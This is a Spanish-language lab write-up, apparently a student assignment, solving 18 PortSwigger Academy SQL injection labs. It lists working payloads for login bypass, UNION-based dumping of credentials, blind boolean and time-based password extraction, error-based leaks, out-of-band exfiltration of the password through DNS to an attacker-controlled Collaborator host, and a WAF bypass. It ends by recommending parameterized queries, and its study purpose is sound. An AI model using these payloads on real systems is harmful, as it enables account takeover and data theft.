---
title: "Actividad 08 - Road to Hall of Fame (SQL Injection)"
description: "Resolución y análisis técnico de 18 laboratorios de SQL Injection en PortSwigger Academy."
date: "2026-03-20"
readTime: ""
image: "/assets/images/posts/img_Act08_portada.png"
slug: "act08-182377"
---

<div align="right">
  <a href="/assets/images/docs_P1/182377-act08.pdf" download>
    📄Descargar Reporte Completo (PDF)
  </a>
</div>

---
## 💾 Introducción

La Inyección SQL (SQLi) permite a un atacante interferir con las consultas que una aplicación realiza a su base de datos. Este documento estructura la resolución técnica de diversos escenarios SQLi utilizando los laboratorios de **PortSwigger Academy** y **Burp Suite**, abordando técnicas *In-band*, *Blind* y *Out-of-band*.

---

## 💾 Marco Teórico (Resumen)

* **¿Qué es SQLi?** Ocurre cuando datos proporcionados por el usuario se concatenan directamente en una consulta sin validación.
* **Tipos de Ataque:**
  * **In-band (Classic):** Usa el mismo canal. Incluye *Union-based* y *Error-based*.
  * **Blind (Inferencial):** La aplicación no devuelve datos. Se usan técnicas *Boolean-based* o *Time-based*.
  * **Out-of-band (OOB):** Obliga a la BD a realizar una solicitud externa (DNS/HTTP).
* **Impacto (Tríada CIA):** Compromete la *Confidencialidad* (robo de datos), *Integridad* (modificación de registros) y *Disponibilidad* (borrado de tablas o DDoS).
* **Defensas Principales:** Consultas Preparadas (Parametrizadas), Validación de Entradas (Listas Blancas) y Principio de Menor Privilegio.

---

## 💾 Laboratorios Resueltos

A continuación, se detalla el análisis de 18 laboratorios estructurados por nivel de dificultad y técnica empleada.

### Lab01: Vulnerabilidad en cláusula WHERE (Datos ocultos)
* **Nivel:** Apprentice
* **Objetivo:** Mostrar productos no lanzados.
* **Vulnerabilidad:** Concatenación directa del filtro de categoría.
* **Payload:** `' OR 1=1--`
* **Explicación:** Cierra la cadena y añade una condición siempre verdadera, comentando el resto de la consulta original.

![Evidencia Lab01](/assets/images/posts/act08_lab01.jpg)

### Lab02: Bypass de Login
* **Nivel:** Apprentice
* **Objetivo:** Acceder como `administrator` sin contraseña.
* **Vulnerabilidad:** Falta de sanitización en el formulario de login.
* **Payload:** `administrator'--` en el campo username.
* **Explicación:** Ignora la validación de la contraseña comentando la consulta original.

![Evidencia Lab02](/assets/images/posts/act08_lab02.jpg)

### Lab03 & 04: Ataque UNION (Determinar columnas y versión)
* **Nivel:** Practitioner
* **Objetivo:** Identificar estructura y versión (Oracle / MySQL / Microsoft).
* **Payload (Columnas):** `' UNION SELECT NULL, NULL FROM DUAL--`
* **Payload (Versión MySQL):** `'+UNION+SELECT+@@version,+NULL#`
* **Explicación:** Se inyectan columnas `NULL` hasta que la página carga correctamente, y luego se extraen variables globales.

![Evidencia Lab04](/assets/images/posts/act08_lab04.jpg)

### Lab05 & 06: Listar contenido de la Base de Datos
* **Nivel:** Practitioner
* **Objetivo:** Extraer credenciales enumerando tablas.
* **Payload (Tablas):** `' UNION SELECT table_name, NULL FROM information_schema.tables--`
* **Payload (Datos):** `' UNION SELECT username_x, password_y FROM users_x--`
* **Explicación:** Uso del esquema de información para mapear la BD y luego volcar las credenciales.

![Evidencia Lab05](/assets/images/posts/act08_lab05.jpg)

### Lab07 a 10: Extracción avanzada con UNION
* **Nivel:** Practitioner
* **Objetivos:** Combinar valores múltiples en columnas únicas usando funciones como `CONCAT(username,':',password)`.

![Evidencia Lab10](/assets/images/posts/act08_lab10.jpg)

### Lab11 & 12: Blind SQLi (Respuestas Condicionales)
* **Nivel:** Practitioner
* **Vulnerabilidad:** Cookie `TrackingId`.
* **Técnica:** Boolean-based.
* **Payloads:**
  * `' AND '1'='1` (Muestra "Welcome back")
  * `' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a`
* **Explicación:** Se extrae la contraseña carácter por carácter enviando peticiones automatizadas (Burp Intruder) y observando cambios en la interfaz.

![Evidencia Lab12](/assets/images/posts/act08_lab12.jpg)

### Lab13: Error-based (Inyección visible)
* **Nivel:** Practitioner
* **Objetivo:** Extraer la contraseña forzando un error de tipo (Cast).
* **Payload:** `' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`
* **Explicación:** El servidor intenta convertir la contraseña en un número entero, fallando y mostrando la contraseña en el log de error de la pantalla.

![Evidencia Lab13](/assets/images/posts/act08_lab13.jpg)

### Lab14 & 15: Blind SQLi (Time Delays)
* **Nivel:** Practitioner
* **Técnica:** Time-based.
* **Payload:** `'%3bSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(2)+ELSE+pg_sleep(0)+END+FROM+users--`
* **Explicación:** Si el carácter adivinado es correcto, la base de datos se pausa 2 segundos, confirmando el valor sin necesidad de cambios visuales.

![Evidencia Lab15](/assets/images/posts/act08_lab15.jpg)

### Lab16 & 17: Out-of-band (OAST) Data Exfiltration
* **Nivel:** Practitioner
* **Objetivo:** Robar datos forzando interacciones DNS a un servidor controlado por el atacante (Burp Collaborator).
* **Payload:** Uso de funciones XML externas (`extractvalue`) concatenando la contraseña como subdominio (`http://[PASSWORD].colaborator.net`).

### Lab18: Filter Bypass via XML Encoding
* **Nivel:** Practitioner
* **Objetivo:** Evadir un WAF que bloquea palabras como `SELECT` o `UNION`.
* **Procedimiento:** Codificar los payloads en entidades hexadecimales (ej. `&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;`) dentro de un *request* XML.

---

## 💾 Conclusiones
La ejecución de estos 18 laboratorios reafirma que la Inyección SQL, a pesar de ser una vulnerabilidad antigua, sigue siendo crítica cuando los desarrolladores confían ciegamente en las entradas del usuario. La prevención definitiva no se logra con filtros o WAFs, sino con el uso estricto de **Consultas Parametrizadas (Prepared Statements)** en la capa de código.

---

## 💾 Visualizar PDF
<embed src="/assets/images/docs_P1/182377-act08.pdf" type="application/pdf" width="100%" height="600px" />